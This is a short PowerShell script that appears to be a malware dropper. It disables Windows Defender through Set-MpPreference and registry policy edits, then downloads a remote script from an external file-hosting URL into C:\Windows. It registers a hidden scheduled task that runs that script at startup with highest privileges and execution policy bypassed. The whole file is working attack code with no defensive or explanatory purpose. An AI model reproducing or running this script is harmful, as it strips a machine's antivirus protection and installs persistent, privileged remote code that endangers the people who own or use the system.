#Render defender totally useless by configuring it in such ways that even if its enabled it will be totally useless
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -ScanArchiveFiles $false -ScanScheduleDay 365 -ScanType 1 -PUAProtection 0 -SevereThreatDefaultAction 0 -HighThreatDefaultAction 0 -ModerateThreatDefaultAction 0 -LowThreatDefaultAction 0

#now disable it in registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force

# Mess with Windows Defender Antivirus service
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Service" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Service" -Name DisableAntiSpyware -Value 1 -Type DWord -Force

# Give Windows Defender a blind spot for Potentially Unwanted Applications (PUA)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DetectPUA -Value 0 -Type DWord -Force

# URL of the file to download
$url = "https://krakenfiles.com/view/6kVnqolWyw/file.html"

# Directory where the file will be downloaded
$downloadDirectory = "C:\Windows"

# Download the file using curl (Invoke-WebRequest)
$downloadPath = Join-Path -Path $downloadDirectory -ChildPath "orkidekobling.ps1"
Invoke-WebRequest -Uri $url -OutFile $downloadPath

# Register a scheduled task to run the downloaded PowerShell script at startup as a background process
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Start-Process 'PowerShell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `'$downloadPath`' -WindowStyle Hidden -Verb RunAs -PassThru`" -NoNewWindow"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd

Register-ScheduledTask -TaskName "Iktorkideservice" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
